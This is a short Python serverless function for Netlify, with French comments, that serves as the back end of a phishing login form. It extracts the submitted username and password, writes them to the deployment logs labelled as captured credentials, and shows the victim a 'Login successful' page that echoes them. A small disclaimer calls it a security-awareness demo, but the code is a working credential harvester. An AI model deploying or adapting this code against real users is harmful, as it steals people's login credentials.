import json

def handler(event, context):
    # Netlify envoie les données du formulaire dans event['body']
    # Mais les données sont encodées en URL-encoded (application/x-www-form-urlencoded)
    # On va les extraire manuellement
    body = event.get('body', '')
    
    # Séparer les paires clé=valeur
    params = {}
    for pair in body.split('&'):
        if '=' in pair:
            key, value = pair.split('=', 1)
            params[key] = value
    
    username = params.get('username', 'inconnu')
    password = params.get('password', 'inconnu')
    
    # Afficher dans les logs Netlify (c'est là que vous verrez les identifiants !)
    print(f"🔴 IDENTIFIANTS CAPTURÉS : username={username}, password={password}")
    
    # Renvoyer une réponse HTML pour que l'utilisateur voie le résultat
    response_html = f"""
    <html>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>Login successful! (Démo pédagogique)</h2>
            <p>Identifiants reçus : <strong>{username}</strong> / <strong>{password}</strong></p>
            <p style="color: red; font-size: 12px;">⚠️ Ceci est une démonstration de sensibilisation à la sécurité.</p>
        </body>
    </html>
    """
    
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'text/html',
        },
        'body': response_html
    }
